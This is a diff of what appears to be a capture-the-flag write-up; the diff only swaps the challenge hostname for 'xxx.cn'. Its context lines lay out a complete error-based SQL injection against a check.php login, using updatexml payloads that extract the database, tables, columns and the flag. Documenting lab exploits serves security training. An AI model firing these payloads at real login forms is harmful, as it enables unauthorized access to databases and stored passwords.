@@ -7,7 +7,7 @@
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password=admin%27
+http://xxx.cn:81/check.php?username=admin&password=admin%27
 ```
 
 
@@ -29,7 +29,7 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password=admin' order by 1%23
+http://xxx.cn:81/check.php?username=admin&password=admin' order by 1%23
 ```
 
 
@@ -55,7 +55,7 @@ http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(database())),'~'),1)%23
+http://xxx.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(database())),'~'),1)%23
 
 
 ~的ASCII码值就是0x7e
@@ -78,7 +78,7 @@ XPATH syntax error: '~geek~'
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),'~'),1)%23
+http://xxx.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),'~'),1)%23
 ```
 
 
@@ -98,7 +98,7 @@ XPATH syntax error: '~H4rDsq1~'
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),'~'),1)%23
+http://xxx.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),'~'),1)%23
 ```
 
 
@@ -118,7 +118,7 @@ XPATH syntax error: '~id,username,password~'
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(password)from(H4rDsq1)),'~'),1)%23
+http://xxx.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(password)from(H4rDsq1)),'~'),1)%23
 ```
 
 
@@ -138,7 +138,7 @@ XPATH syntax error: '~flag{6de4f947-feea-4f48-af1e-b1'
 
 
 ```sql
-http://d33ccc9f-5b20-4f07-b47a-2514382628a0.node4.buuoj.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(right((password),30))from(H4rDsq1)),'~'),1)%23
+http://xxx.cn:81/check.php?username=admin&password='^updatexml(1,concat('~',(select(right((password),30))from(H4rDsq1)),'~'),1)%23
 ```
 
 
